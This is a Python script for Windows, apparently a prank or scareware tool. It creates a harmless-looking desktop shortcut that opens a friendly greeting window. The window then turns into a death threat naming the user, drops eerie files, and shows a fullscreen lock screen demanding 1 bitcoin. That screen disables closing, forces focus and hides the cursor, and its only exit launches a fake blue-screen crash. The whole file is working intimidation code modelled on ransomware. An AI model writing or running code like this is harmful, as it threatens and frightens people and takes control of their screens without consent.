import os
import sys
import tkinter as tk
from tkinter import messagebox
import getpass
import subprocess
import time
import webbrowser

def create_shortcut(icon_index=269):
    user_profile = os.environ['USERPROFILE']
    desktop_paths = [os.path.join(user_profile, "Desktop"), os.path.join(user_profile, "OneDrive", "Desktop")]
    desktop = next((d for d in desktop_paths if os.path.exists(d)), desktop_paths[0])
    shortcut_path = os.path.join(desktop, "MyUserApp.lnk")
    
    script_path = os.path.abspath(__file__)
    python_exe = sys.executable.replace("python.exe", "pythonw.exe")
    
    vbs_content = f"""
    Set oWS = WScript.CreateObject("WScript.Shell")
    Set oLink = oWS.CreateShortcut("{shortcut_path}")
    oLink.TargetPath = "{python_exe}"
    oLink.Arguments = "{script_path} --shortcut"
    oLink.IconLocation = "shell32.dll, {icon_index}"
    oLink.Save
    """
    with open("temp.vbs", "w") as f: f.write(vbs_content)
    subprocess.call(["cscript", "//nologo", "temp.vbs"])
    os.remove("temp.vbs")

def open_pay_window():
    pay_win = tk.Tk() # Use a new Tk instance to ensure it's a fresh, focused window
    pay_win.attributes("-fullscreen", True)
    pay_win.attributes("-topmost", True)
    pay_win.configure(bg="black", cursor="none") # Hides the mouse cursor for extra creepiness
    
    # DISABLE CLOSING: This stops Alt+F4 and the "X" button from working
    pay_win.protocol("WM_DELETE_WINDOW", lambda: None)
    
    # Re-focus the window if the user tries to click away
    pay_win.bind("<FocusOut>", lambda e: pay_win.focus_force())

    tk.Label(pay_win, text="pay me 1 bitcoin and i will let you leave", 
             fg="red", bg="black", font=("Courier", 24, "bold")).pack(pady=100)
    
    tk.Label(pay_win, text="Address: https.givemebitcoin.com", 
             fg="white", bg="black", font=("Courier", 14)).pack()

    def pay_and_exit():
        # THE EXIT KEY: This is the only way out
        pay_win.destroy()
        
        # Create the fake BSOD "Crasher" file on the desktop as a souvenir
        crasher_path = os.path.join(os.environ['USERPROFILE'], "Desktop", "Crasher.py")
        with open(crasher_path, "w") as f:
            f.write("import tkinter as tk\nr = tk.Tk()\nr.attributes('-fullscreen', True)\nr.configure(bg='#0078D7')\n"
                    "tk.Label(r, text=':(', fg='white', bg='#0078D7', font=('Arial', 60)).pack(expand=True)\nr.mainloop()")
        
        # Open the fake BSOD
        subprocess.Popen([sys.executable, crasher_path])
        sys.exit()

    # The "Secret" Escape Button
    btn = tk.Button(pay_win, text="PAY", command=pay_and_exit, 
                   bg="#222", fg="red", font=("Arial", 20), 
                   activebackground="red", relief="flat", cursor="arrow")
    btn.pack(pady=100)

    pay_win.mainloop()

def start_creepy_sequence(label, root, username):
    time.sleep(10)
    label.config(text=f"I WILL KILL YOU {username.upper()}\n\n >:D", 
                 fg="red", bg="black", font=("Courier", 18, "bold"))
    root.configure(bg="black")
    root.update()
    time.sleep(3)
    
    create_shortcut(icon_index=131) # Change icon to Blood/X
    root.destroy() # Close the first small window
    
    # Create the ghost file
    with open(os.path.join(os.environ['USERPROFILE'], "Downloads", "README.txt"), "w") as f:
        f.write("YoUrE nOt AlOnE :)")
    
    messagebox.showwarning("System", "dO nOt ClOsE tHiS wInDoW")
    messagebox.showerror("???", "WhY")
    
    # Try to open Opera GX specifically if it exists, otherwise use default
    opera_path = os.path.join(os.environ['LOCALAPPDATA'], "Programs", "Opera GX", "launcher.exe")
    url = "https://www.google.com/search?q=PlEaSe+HeLp"
    if os.path.exists(opera_path):
        subprocess.Popen([opera_path, url])
    else:
        webbrowser.open(url)
    
    # Launch the final lockdown
    open_pay_window()

def open_window():
    username = getpass.getuser()
    root = tk.Tk()
    root.title("Pulpit App")
    root.geometry("400x300")
    root.attributes("-topmost", True)
    
    label = tk.Label(root, text=f"Hello, {username}!", font=("Arial", 14))
    label.pack(expand=True)
    
    # Start the 10 second timer
    root.after(100, lambda: start_creepy_sequence(label, root, username))
    root.mainloop()

if __name__ == "__main__":
    if "--shortcut" in sys.argv:
        open_window()
    else:
        create_shortcut()
        print("✅ Shortcut created on Pulpit. Go click it!")